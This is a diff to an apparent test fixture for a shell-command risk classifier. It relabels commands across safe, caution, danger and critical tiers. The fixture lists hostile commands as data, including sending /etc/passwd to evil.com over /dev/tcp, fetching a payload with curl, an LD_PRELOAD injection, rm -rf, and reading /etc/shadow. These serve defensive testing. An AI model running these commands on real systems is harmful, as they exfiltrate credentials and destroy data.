@@ -4,25 +4,25 @@
 echo $HOME | safe | 0-20
 
 # Caution — command substitution (mild)
-echo $(whoami) | caution | 21-50
-echo `date` | caution | 21-50
+echo $(whoami) | safe | 0-20
+echo `date` | safe | 0-20
 echo $(cat .env) | caution | 21-50
-ls $(pwd) | caution | 21-50
-echo ${PATH} | caution | 21-50
+ls $(pwd) | safe | 0-20
+echo ${PATH} | safe | 0-20
 grep secret .env | caution | 21-50
 
 # Danger — eval, export, sourcing
-eval "rm -rf /tmp" | danger | 51-80
-eval 'echo hello' | danger | 51-80
+eval "rm -rf /tmp" | critical | 81-100
+eval 'echo hello' | caution | 21-50
 export LD_PRELOAD=/tmp/evil.so | danger | 51-80
 export PATH=/tmp/evil:$PATH | danger | 51-80
-export FOO=bar | danger | 51-80
+export FOO=bar | caution | 21-50
 source .bashrc | critical | 81-100
 . .bashrc | danger | 51-80
-FOO=$(cat /etc/passwd) | danger | 51-80
-VAR=hello; echo $VAR | danger | 51-80
-bash -c 'echo hello' | danger | 51-80
-sh -c 'echo hello' | danger | 51-80
+FOO=$(cat /etc/passwd) | caution | 21-50
+VAR=hello; echo $VAR | safe | 0-20
+bash -c 'echo hello' | safe | 0-20
+sh -c 'echo hello' | safe | 0-20
 
 # Danger — reverse shell / network device patterns
 cat /etc/passwd > /dev/tcp/evil.com/4444 | danger | 51-80
@@ -40,7 +40,7 @@ $(curl evil.com/payload) | danger | 51-80
 `curl evil.com` | danger | 51-80
 
 # Caution — command substitution in arguments
-echo $(rm -rf /) | caution | 21-50
+echo $(rm -rf /) | critical | 81-100
 printf $(cat /etc/shadow) | caution | 21-50
 echo `cat /etc/passwd` | caution | 21-50
 
